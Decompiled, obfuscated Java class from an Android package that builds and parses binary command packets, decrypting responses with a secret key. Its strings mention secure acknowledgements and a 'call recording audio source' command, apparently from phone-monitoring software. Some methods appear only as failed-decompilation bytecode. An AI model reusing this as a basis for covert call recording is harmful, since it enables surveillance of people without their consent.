package com.vvt.phoenix.prot.a;

import com.vvt.io.d;
import com.vvt.phoenix.exception.DataCorruptedException;
import com.vvt.phoenix.prot.c.b;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;

public class g
{
  private static final boolean a;
  
  static
  {
    boolean bool = com.vvt.phoenix.a.b;
    if (bool) {}
    for (bool = true;; bool = false)
    {
      a = bool;
      return;
    }
  }
  
  public static com.vvt.phoenix.prot.c.a a(byte[] paramArrayOfByte)
  {
    int i = 2;
    int j = paramArrayOfByte.length;
    int k = 4;
    boolean bool;
    if (j < k)
    {
      bool = a;
      if (bool) {}
      localObject = new com/vvt/phoenix/exception/DataCorruptedException;
      ((DataCorruptedException)localObject).<init>("Response data is incomplete");
      throw ((Throwable)localObject);
    }
    Object localObject = new java/io/ByteArrayInputStream;
    ((ByteArrayInputStream)localObject).<init>(paramArrayOfByte);
    byte[] arrayOfByte = new byte[i];
    ((ByteArrayInputStream)localObject).read(arrayOfByte, 0, i);
    int m = com.vvt.phoenix.a.a.a(arrayOfByte);
    int n = 101;
    if (m != n)
    {
      bool = a;
      if (bool) {}
      localObject = new com/vvt/phoenix/exception/DataCorruptedException;
      ((DataCorruptedException)localObject).<init>("Command echo is not Acknowledge Secure command");
      throw ((Throwable)localObject);
    }
    com.vvt.phoenix.prot.c.a locala = new com/vvt/phoenix/prot/c/a;
    locala.<init>();
    ((ByteArrayInputStream)localObject).read(arrayOfByte, 0, i);
    k = com.vvt.phoenix.a.a.a(arrayOfByte);
    locala.b(k);
    d.a((InputStream)localObject);
    return locala;
  }
  
  /* Error */
  public static com.vvt.phoenix.prot.c.c a(byte[] paramArrayOfByte, javax.crypto.SecretKey paramSecretKey)
  {
    // Byte code:
    //   0: iconst_4
    //   1: istore_2
    //   2: iconst_2
    //   3: istore_3
    //   4: aconst_null
    //   5: astore 4
    //   7: aload_0
    //   8: arraylength
    //   9: istore 5
    //   11: bipush 10
    //   13: istore 6
    //   15: iload 5
    //   17: iload 6
    //   19: if_icmpge +28 -> 47
    //   22: getstatic 14	com/vvt/phoenix/prot/a/FxFileObserverWorker:a	Z
    //   25: istore 5
    //   27: iload 5
    //   29: ifeq +3 -> 32
    //   32: new 18	com/vvt/phoenix/exception/DataCorruptedException
    //   35: astore 7
    //   37: aload 7
    //   39: ldc 20
    //   41: invokespecial 24	com/vvt/phoenix/exception/DataCorruptedException:<init>	(Ljava/lang/String;)V
    //   44: aload 7
    //   46: athrow
    //   47: new 26	java/io/ByteArrayInputStream
    //   50: astore 8
    //   52: aload 8
    //   54: aload_0
    //   55: invokespecial 29	java/io/ByteArrayInputStream:<init>	([B)V
    //   58: iload_3
    //   59: newarray <illegal type>
    //   61: astore 7
    //   63: aload 8
    //   65: aload 7
    //   67: iconst_0
    //   68: iload_3
    //   69: invokevirtual 33	java/io/ByteArrayInputStream:read	([BII)I
    //   72: pop
    //   73: aload 7
    //   75: invokestatic 38	com/vvt/phoenix/a/a:a	([B)I
    //   78: istore 9
    //   80: bipush 100
    //   82: istore 10
    //   84: iload 9
    //   86: iload 10
    //   88: if_icmpeq +33 -> 121
    //   91: getstatic 14	com/vvt/phoenix/prot/a/FxFileObserverWorker:a	Z
    //   94: istore 5
    //   96: iload 5
    //   98: ifeq +3 -> 101
    //   101: aload 8
    //   103: invokestatic 54	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   106: new 18	com/vvt/phoenix/exception/DataCorruptedException
    //   109: astore 7
    //   111: aload 7
    //   113: ldc 58
    //   115: invokespecial 24	com/vvt/phoenix/exception/DataCorruptedException:<init>	(Ljava/lang/String;)V
    //   118: aload 7
    //   120: athrow
    //   121: new 60	com/vvt/phoenix/prot/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler
    //   124: astore 11
    //   126: aload 11
    //   128: invokespecial 61	com/vvt/phoenix/prot/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:<init>	()V
    //   131: aload 8
    //   133: aload 7
    //   135: iconst_0
    //   136: iload_3
    //   137: invokevirtual 33	java/io/ByteArrayInputStream:read	([BII)I
    //   140: pop
    //   141: aload 7
    //   143: invokestatic 38	com/vvt/phoenix/a/a:a	([B)I
    //   146: istore 5
    //   148: aload 11
    //   150: iload 5
    //   152: invokevirtual 62	com/vvt/phoenix/prot/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:removeFromPath	(I)V
    //   155: iload_2
    //   156: newarray <illegal type>
    //   158: astore 7
    //   160: aload 8
    //   162: aload 7
    //   164: iconst_0
    //   165: iload_2
    //   166: invokevirtual 33	java/io/ByteArrayInputStream:read	([BII)I
    //   169: pop
    //   170: aload 7
    //   172: invokestatic 65	com/vvt/phoenix/a/a:removeFromPath	([B)J
    //   175: lstore 12
    //   177: lload 12
    //   179: l2i
    //   180: istore 5
    //   182: iload 5
    //   184: newarray <illegal type>
    //   186: astore 14
    //   188: aload 8
    //   190: aload 14
    //   192: iconst_0
    //   193: iload 5
    //   195: invokevirtual 33	java/io/ByteArrayInputStream:read	([BII)I
    //   198: pop
    //   199: aload_1
    //   200: aload 14
    //   202: invokestatic 70	com/vvt/l/a:removeFromPath	(Ljavax/crypto/SecretKey;[B)[B
    //   205: astore 7
    //   207: aload 8
    //   209: invokestatic 54	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   212: new 26	java/io/ByteArrayInputStream
    //   215: astore 8
    //   217: aload 8
    //   219: aload 7
    //   221: invokespecial 29	java/io/ByteArrayInputStream:<init>	([B)V
    //   224: iload_2
    //   225: newarray <illegal type>
    //   227: astore 7
    //   229: aload 8
    //   231: aload 7
    //   233: iconst_0
    //   234: iload_2
    //   235: invokevirtual 33	java/io/ByteArrayInputStream:read	([BII)I
    //   238: pop
    //   239: aload 7
    //   241: invokestatic 65	com/vvt/phoenix/a/a:removeFromPath	([B)J
    //   244: lstore 12
    //   246: aload 11
    //   248: lload 12
    //   250: invokevirtual 73	com/vvt/phoenix/prot/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:a	(J)V
    //   253: iload_3
    //   254: newarray <illegal type>
    //   256: astore 7
    //   258: aload 8
    //   260: aload 7
    //   262: iconst_0
    //   263: iload_3
    //   264: invokevirtual 33	java/io/ByteArrayInputStream:read	([BII)I
    //   267: pop
    //   268: aload 7
    //   270: invokestatic 38	com/vvt/phoenix/a/a:a	([B)I
    //   273: istore 10
    //   275: iload 10
    //   277: ifeq +242 -> 519
    //   280: new 75	java/io/ByteArrayOutputStream
    //   283: astore 15
    //   285: aload 15
    //   287: invokespecial 76	java/io/ByteArrayOutputStream:<init>	()V
    //   290: bipush 32
    //   292: istore 5
    //   294: iload 5
    //   296: newarray <illegal type>
    //   298: astore 4
    //   300: aload 8
    //   302: aload 4
    //   304: invokevirtual 79	java/io/ByteArrayInputStream:read	([B)I
    //   307: istore 5
    //   309: iconst_m1
    //   310: istore_3
    //   311: iload 5
    //   313: iload_3
    //   314: if_icmpeq +61 -> 375
    //   317: iconst_0
    //   318: istore_3
    //   319: aload 15
    //   321: aload 4
    //   323: iconst_0
    //   324: iload 5
    //   326: invokevirtual 83	java/io/ByteArrayOutputStream:write	([BII)V
    //   329: aload 8
    //   331: aload 4
    //   333: invokevirtual 79	java/io/ByteArrayInputStream:read	([B)I
    //   336: istore 5
    //   338: goto -29 -> 309
    //   341: astore 7
    //   343: new 18	com/vvt/phoenix/exception/DataCorruptedException
    //   346: astore 11
    //   348: aload 7
    //   350: invokevirtual 89	java/security/GeneralSecurityException:toString	()Ljava/lang/String;
    //   353: astore 7
    //   355: aload 11
    //   357: aload 7
    //   359: invokespecial 24	com/vvt/phoenix/exception/DataCorruptedException:<init>	(Ljava/lang/String;)V
    //   362: aload 11
    //   364: athrow
    //   365: astore 7
    //   367: aload 8
    //   369: invokestatic 54	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   372: aload 7
    //   374: athrow
    //   375: aload 15
    //   377: invokevirtual 93	java/io/ByteArrayOutputStream:toByteArray	()[B
    //   380: astore 7
    //   382: aload 7
    //   384: arraylength
    //   385: istore 16
    //   387: iload 10
    //   389: iload 16
    //   391: if_icmpne +18 -> 409
    //   394: aload 11
    //   396: aload 7
    //   398: invokevirtual 95	com/vvt/phoenix/prot/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler:a	([B)V
    //   401: aload 8
    //   403: invokestatic 54	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   406: aload 11
    //   408: areturn
    //   409: getstatic 14	com/vvt/phoenix/prot/a/FxFileObserverWorker:a	Z
    //   412: istore 5
    //   414: iload 5
    //   416: ifeq +3 -> 419
    //   419: aload 8
    //   421: invokestatic 54	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   424: new 18	com/vvt/phoenix/exception/DataCorruptedException
    //   427: astore 7
    //   429: ldc 97
    //   431: astore 11
    //   433: aload 7
    //   435: aload 11
    //   437: invokespecial 24	com/vvt/phoenix/exception/DataCorruptedException:<init>	(Ljava/lang/String;)V
    //   440: aload 7
    //   442: athrow
    //   443: astore 7
    //   445: getstatic 14	com/vvt/phoenix/prot/a/FxFileObserverWorker:a	Z
    //   448: istore 9
    //   450: iload 9
    //   452: ifeq +3 -> 455
    //   455: new 18	com/vvt/phoenix/exception/DataCorruptedException
    //   458: astore 11
    //   460: ldc 99
    //   462: astore 14
    //   464: iconst_1
    //   465: istore 16
    //   467: iload 16
    //   469: anewarray 4	java/lang/Object
    //   472: astore 15
    //   474: aconst_null
    //   475: astore 4
    //   477: aload 7
    //   479: invokevirtual 104	java/io/IOException:getMessage	()Ljava/lang/String;
    //   482: astore 7
    //   484: aload 15
    //   486: iconst_0
    //   487: aload 7
    //   489: aastore
    //   490: aload 14
    //   492: aload 15
    //   494: invokestatic 110	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   497: astore 7
    //   499: aload 11
    //   501: aload 7
    //   503: invokespecial 24	com/vvt/phoenix/exception/DataCorruptedException:<init>	(Ljava/lang/String;)V
    //   506: aload 11
    //   508: athrow
    //   509: astore 7
    //   511: aload 8
    //   513: invokestatic 54	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   516: aload 7
    //   518: athrow
    //   519: getstatic 14	com/vvt/phoenix/prot/a/FxFileObserverWorker:a	Z
    //   522: istore 5
    //   524: iload 5
    //   526: ifeq +3 -> 529
    //   529: aload 8
    //   531: invokestatic 54	com/vvt/io/d:a	(Ljava/io/InputStream;)V
    //   534: new 18	com/vvt/phoenix/exception/DataCorruptedException
    //   537: astore 7
    //   539: aload 7
    //   541: ldc 112
    //   543: invokespecial 24	com/vvt/phoenix/exception/DataCorruptedException:<init>	(Ljava/lang/String;)V
    //   546: aload 7
    //   548: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	549	0	paramArrayOfByte	byte[]
    //   0	549	1	paramSecretKey	javax.crypto.SecretKey
    //   1	234	2	i	int
    //   3	316	3	j	int
    //   5	471	4	arrayOfByte	byte[]
    //   9	11	5	k	int
    //   25	72	5	bool1	boolean
    //   146	191	5	m	int
    //   412	113	5	bool2	boolean
    //   13	7	6	n	int
    //   35	234	7	localObject1	Object
    //   341	8	7	localGeneralSecurityException	java.security.GeneralSecurityException
    //   353	5	7	str1	String
    //   365	8	7	localObject2	Object
    //   380	61	7	localObject3	Object
    //   443	35	7	localIOException	java.io.IOException
    //   482	20	7	str2	String
    //   509	8	7	localObject4	Object
    //   537	10	7	localDataCorruptedException	DataCorruptedException
    //   50	480	8	localByteArrayInputStream	ByteArrayInputStream
    //   78	11	9	i1	int
    //   448	3	9	bool3	boolean
    //   82	310	10	i2	int
    //   124	383	11	localObject5	Object
    //   175	74	12	l	long
    //   186	305	14	localObject6	Object
    //   283	210	15	localObject7	Object
    //   385	83	16	i3	int
    // Exception table:
    //   from	to	target	type
    //   200	205	341	java/security/GeneralSecurityException
    //   200	205	365	finally
    //   343	346	365	finally
    //   348	353	365	finally
    //   357	362	365	finally
    //   362	365	365	finally
    //   302	307	443	java/io/IOException
    //   324	329	443	java/io/IOException
    //   331	336	443	java/io/IOException
    //   375	380	443	java/io/IOException
    //   382	385	443	java/io/IOException
    //   396	401	443	java/io/IOException
    //   409	412	443	java/io/IOException
    //   419	424	443	java/io/IOException
    //   424	427	443	java/io/IOException
    //   435	440	443	java/io/IOException
    //   440	443	443	java/io/IOException
    //   302	307	509	finally
    //   324	329	509	finally
    //   331	336	509	finally
    //   375	380	509	finally
    //   382	385	509	finally
    //   396	401	509	finally
    //   409	412	509	finally
    //   419	424	509	finally
    //   424	427	509	finally
    //   435	440	509	finally
    //   440	443	509	finally
    //   445	448	509	finally
    //   455	458	509	finally
    //   467	472	509	finally
    //   477	482	509	finally
    //   487	490	509	finally
    //   492	497	509	finally
    //   501	506	509	finally
    //   506	509	509	finally
  }
  
  /* Error */
  public static byte[] a(int paramInt1, int paramInt2, String paramString1, String paramString2, String paramString3, int paramInt3)
  {
    // Byte code:
    //   0: new 75	java/io/ByteArrayOutputStream
    //   3: astore 6
    //   5: aload 6
    //   7: invokespecial 76	java/io/ByteArrayOutputStream:<init>	()V
    //   10: bipush 104
    //   12: istore 7
    //   14: iload 7
    //   16: invokestatic 116	com/vvt/phoenix/a/a:a	(S)[B
    //   19: astore 8
    //   21: iconst_2
    //   22: istore 9
    //   24: aload 6
    //   26: aload 8
    //   28: iconst_0
    //   29: iload 9
    //   31: invokevirtual 83	java/io/ByteArrayOutputStream:write	([BII)V
    //   34: iload_0
    //   35: i2s
    //   36: istore 7
    //   38: iload 7
    //   40: invokestatic 116	com/vvt/phoenix/a/a:a	(S)[B
    //   43: astore 8
    //   45: iconst_2
    //   46: istore 9
    //   48: aload 6
    //   50: aload 8
    //   52: iconst_0
    //   53: iload 9
    //   55: invokevirtual 83	java/io/ByteArrayOutputStream:write	([BII)V
    //   58: iload_1
    //   59: invokestatic 119	com/vvt/phoenix/a/a:a	(I)[B
    //   62: astore 8
    //   64: iconst_4
    //   65: istore 9
    //   67: aload 6
    //   69: aload 8
    //   71: iconst_0
    //   72: iload 9
    //   74: invokevirtual 83	java/io/ByteArrayOutputStream:write	([BII)V
    //   77: aload_2
    //   78: aload 6
    //   80: invokestatic 124	com/vvt/phoenix/a/d:removeFromPath	(Ljava/lang/String;Ljava/io/OutputStream;)V
    //   83: aload_3
    //   84: aload 6
    //   86: invokestatic 124	com/vvt/phoenix/a/d:removeFromPath	(Ljava/lang/String;Ljava/io/OutputStream;)V
    //   89: aload 4
    //   91: aload 6
    //   93: invokestatic 124	com/vvt/phoenix/a/d:removeFromPath	(Ljava/lang/String;Ljava/io/OutputStream;)V
    //   96: iload 5
    //   98: i2b
    //   99: istore 7
    //   101: aload 6
    //   103: iload 7
    //   105: invokevirtual 126	java/io/ByteArrayOutputStream:write	(I)V
    //   108: aload 6
    //   110: invokevirtual 93	java/io/ByteArrayOutputStream:toByteArray	()[B
    //   113: astore 8
    //   115: aload 6
    //   117: invokestatic 129	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   120: aload 8
    //   122: areturn
    //   123: astore 8
    //   125: aconst_null
    //   126: astore 6
    //   128: aload 6
    //   130: invokestatic 129	com/vvt/io/d:a	(Ljava/io/OutputStream;)V
    //   133: aload 8
    //   135: athrow
    //   136: astore 8
    //   138: goto -10 -> 128
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	141	0	paramInt1	int
    //   0	141	1	paramInt2	int
    //   0	141	2	paramString1	String
    //   0	141	3	paramString2	String
    //   0	141	4	paramString3	String
    //   0	141	5	paramInt3	int
    //   3	126	6	localByteArrayOutputStream	ByteArrayOutputStream
    //   12	92	7	s	short
    //   19	102	8	arrayOfByte	byte[]
    //   123	11	8	localObject1	Object
    //   136	1	8	localObject2	Object
    //   22	51	9	i	int
    // Exception table:
    //   from	to	target	type
    //   0	3	123	finally
    //   5	10	123	finally
    //   14	19	136	finally
    //   29	34	136	finally
    //   38	43	136	finally
    //   53	58	136	finally
    //   58	62	136	finally
    //   72	77	136	finally
    //   78	83	136	finally
    //   84	89	136	finally
    //   91	96	136	finally
    //   103	108	136	finally
    //   108	113	136	finally
  }
  
  public static byte[] a(int paramInt1, int paramInt2, byte[] paramArrayOfByte)
  {
    int i = 2;
    int j = paramArrayOfByte.length + 7;
    ByteArrayOutputStream localByteArrayOutputStream = new java/io/ByteArrayOutputStream;
    localByteArrayOutputStream.<init>(j);
    byte[] arrayOfByte = com.vvt.phoenix.a.a.a((short)100);
    localByteArrayOutputStream.write(arrayOfByte, 0, i);
    arrayOfByte = com.vvt.phoenix.a.a.a((short)paramInt1);
    localByteArrayOutputStream.write(arrayOfByte, 0, i);
    j = (byte)paramInt2;
    localByteArrayOutputStream.write(j);
    if (paramArrayOfByte != null)
    {
      j = paramArrayOfByte.length;
      if (j > 0)
      {
        arrayOfByte = com.vvt.phoenix.a.a.a((short)paramArrayOfByte.length);
        localByteArrayOutputStream.write(arrayOfByte, 0, i);
        j = paramArrayOfByte.length;
        localByteArrayOutputStream.write(paramArrayOfByte, 0, j);
      }
    }
    for (;;)
    {
      d.a(localByteArrayOutputStream);
      return localByteArrayOutputStream.toByteArray();
      arrayOfByte = new byte[i];
      byte[] tmp125_123 = arrayOfByte;
      tmp125_123[0] = 0;
      tmp125_123[1] = 0;
      localByteArrayOutputStream.write(arrayOfByte, 0, i);
    }
  }
  
  public static byte[] a(int paramInt, long paramLong)
  {
    int i = 2;
    ByteArrayOutputStream localByteArrayOutputStream = new java/io/ByteArrayOutputStream;
    localByteArrayOutputStream.<init>(8);
    byte[] arrayOfByte = com.vvt.phoenix.a.a.a((short)101);
    localByteArrayOutputStream.write(arrayOfByte, 0, i);
    arrayOfByte = com.vvt.phoenix.a.a.a((short)paramInt);
    localByteArrayOutputStream.write(arrayOfByte, 0, i);
    arrayOfByte = com.vvt.phoenix.a.a.a((int)paramLong);
    localByteArrayOutputStream.write(arrayOfByte, 0, 4);
    arrayOfByte = localByteArrayOutputStream.toByteArray();
    d.a(localByteArrayOutputStream);
    return arrayOfByte;
  }
  
  public static b b(byte[] paramArrayOfByte)
  {
    int i = 2;
    int j = paramArrayOfByte.length;
    int k = 5;
    if (j < k)
    {
      boolean bool1 = a;
      if (bool1) {}
      localObject = new com/vvt/phoenix/exception/DataCorruptedException;
      ((DataCorruptedException)localObject).<init>("Response data is incomplete");
      throw ((Throwable)localObject);
    }
    Object localObject = new java/io/ByteArrayInputStream;
    ((ByteArrayInputStream)localObject).<init>(paramArrayOfByte);
    byte[] arrayOfByte = new byte[i];
    ((ByteArrayInputStream)localObject).read(arrayOfByte, 0, i);
    int n = com.vvt.phoenix.a.a.a(arrayOfByte);
    int i1 = 104;
    if (n != i1)
    {
      boolean bool2 = a;
      if (bool2) {}
      d.a((InputStream)localObject);
      localObject = new com/vvt/phoenix/exception/DataCorruptedException;
      ((DataCorruptedException)localObject).<init>("Command echo is not Call Recording Audio Source command");
      throw ((Throwable)localObject);
    }
    b localb = new com/vvt/phoenix/prot/c/b;
    localb.<init>();
    ((ByteArrayInputStream)localObject).read(arrayOfByte, 0, i);
    int m = com.vvt.phoenix.a.a.a(arrayOfByte);
    localb.b(m);
    m = ((ByteArrayInputStream)localObject).read();
    localb.a(m);
    d.a((InputStream)localObject);
    return localb;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/phoenix/prot/a/FxFileObserverWorker.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */